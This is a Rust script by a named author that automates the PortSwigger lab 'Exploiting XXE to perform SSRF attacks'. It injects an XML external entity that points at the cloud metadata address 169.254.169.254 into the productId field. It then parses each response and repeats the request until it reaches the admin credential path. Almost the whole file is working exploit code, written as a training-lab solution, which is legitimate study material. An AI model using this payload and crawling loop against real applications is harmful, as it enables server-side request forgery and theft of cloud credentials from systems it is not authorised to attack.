/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 14/10/2023
*
* Lab: Exploiting XXE to perform SSRF attacks
*
* Steps: 1. Inject payload into 'productId' XML element to retrieve the path via SSRF
*        2. Extract the path from the response
*        3. Repeat the process with the new extracted path until you fetch 
*           the admin information
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0ab900450475ebdd84a8afb300cd00d0.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "âŸª#âŸ« Injection point:".blue(), "productId".yellow(),);

    // the vector that will hold all paths
    let mut paths: Vec<String> = Vec::from(["/".to_string()]);

    // we need 6 requests to solve this lab
    for i in 0..6 {
        // get the next path of the vector
        let path = &paths[i];

        // payload to fetch the next path in the vector via SSRF
        let payload = format!(
            r###"<?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254{path}">]>
                <stockCheck>
                    <productId>
                        &xxe;
                    </productId>
                    <storeId>
                        1
                    </storeId>
                </stockCheck>"###
        );

        // don't print the initial request
        if i != 0 {
            print!(
                "â¦—{}â¦˜ {} {}.. ",
                i.to_string(),
                "Injecting payload to retrieve the path number".white(),
                i.to_string().blue(),
            );
            io::stdout().flush();
        }

        // fetch the page with the injected payload
        let injection = client
            .post(format!("{url}/product/stock"))
            .header("Content-Type", "application/xml")
            .body(payload)
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload".red()
            ));

        // get the body of the response
        let body = injection.text().unwrap();

        // extract the new path
        let new_path = capture_pattern(r"ID:\s*(.*)\s*", &body)
            .expect(&format!("{}", "[!] Failed to extract the new path".red()));

        // concat the new_path with the previous one and push the result to the vector of paths
        paths.push(format!("{path}{new_path}/"));

        // don't print the initial request
        if i != 0 {
            println!("{} => {}", "OK".green(), &paths[i].yellow());
        }
    }

    println!(
        "{} {}",
        "ðŸ—¹ Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
